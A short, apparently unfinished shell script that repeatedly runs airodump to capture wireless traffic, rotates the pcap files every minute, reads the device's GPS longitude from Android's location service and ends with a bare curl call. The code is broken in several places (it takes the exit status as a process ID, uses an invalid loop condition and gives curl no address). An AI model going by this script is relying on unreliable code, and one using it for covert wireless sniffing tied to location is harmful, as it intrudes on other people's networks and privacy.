airodump &
PID=$?
while 1; do
    sleep 60
    kill $PID
    mv 1.pcap 2.pcap
    airodump &
    PID=$?
    dumpsys location|grep "LongitudeDegrees: " | cut -d " |," -f13
    cap2
    curl
done